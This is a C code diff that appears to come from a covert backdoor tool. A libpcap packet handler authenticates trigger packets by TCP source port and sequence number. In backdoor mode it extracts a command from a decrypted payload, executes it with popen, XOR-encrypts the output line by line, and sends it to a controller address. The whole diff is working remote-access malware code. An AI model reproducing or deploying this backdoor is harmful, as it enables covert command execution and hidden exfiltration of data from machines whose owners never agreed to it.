@@ -4,6 +4,7 @@
 #include <string.h>
 #include <unistd.h>
 
+#include "constants.h"
 #include "crypto.h"
 #include "networking.h"
 #include "packet_auth.h"
@@ -103,14 +104,20 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
-        // printf("Inauthentic packet:\n Source port: %u\n, Seqnum: %u\n", tcp_sport, tcp_seqnum);
         return;
     }
-    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
+
+    if (mode == BACKDOOR)
+    {
+        printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
+    }
 
     inet_ntop(AF_INET, &this_ip.s_addr, ip_str_local, INET_ADDRSTRLEN);
     inet_ntop(AF_INET, &ip->ip_src.s_addr, ip_str_recv, INET_ADDRSTRLEN);
-    printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
+    if (mode == BACKDOOR)
+    {
+        printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
+    }
 
     if (ip->ip_src.s_addr == this_ip.s_addr)
     {
@@ -139,14 +146,12 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
 void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const struct in_addr address)
 {
-    char **command_output_ptr;
-    char *command_output;
-    char *encrypted_command_output;
-
+    FILE *fp;
     char *command;
     char *end_ptr;
-
-    int command_output_size;
+    char line_buffer[MAX_LINE_LEN];
+    char encrypted[MAX_LINE_LEN];
+    int num_read;
 
     // Step 4: Verify decrypted payload has a command in it
     if (!(command = strstr(decrypted, COMMAND_START)))
@@ -163,36 +168,22 @@ void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const st
     *end_ptr = 0;
 
     // Step 5: Execute the command
-    command_output_ptr = execute_command(command, &command_output_size);
-    printf("Command executed:\n%s\n", command);
+    fp = popen(command, "r");
 
-    int total_size = 0;
-    int offset = 0;
-    for (int i = 0; i < command_output_size; i++)
+    // grab all the lines and realloc and concat string as needed
+    memset(line_buffer, 0, MAX_LINE_LEN);
+    memset(encrypted, 0, MAX_LINE_LEN);
+    while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
-        total_size += (strlen(command_output_ptr[i]) + 1);
+        xor_bytes(XOR_KEY, strlen(XOR_KEY), line_buffer, encrypted, strlen(line_buffer));
+        send_message_to_ip(this_ip, address, SERVER_PORT, encrypted, strlen(line_buffer));
+        memset(line_buffer, 0, MAX_LINE_LEN);
+        memset(encrypted, 0, MAX_LINE_LEN);
     }
-
-    // Allocate a string to hold all the strings in the list
-    command_output = malloc(total_size);
-    for (int i = 0; i < command_output_size; i++)
-    {
-        offset += sprintf(command_output + offset, "%s", command_output_ptr[i]);
-    }
-    printf("Command output: \n%s\n", command_output);
-
-    // Step 6: Send the results back
-    encrypted_command_output = malloc(total_size);
-    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, total_size);
-    send_message_to_ip(this_ip, address, SERVER_PORT, encrypted_command_output, total_size);
-
-    free(encrypted_command_output);
-    // free command_output which was malloced by
-    free(command_output);
+    pclose(fp);
 }
 
 void controller_mode(const char *decrypted)
 {
-    printf("Received response:\n%s\n", decrypted);
-    exit(0);
+    printf("%s", decrypted);
 }
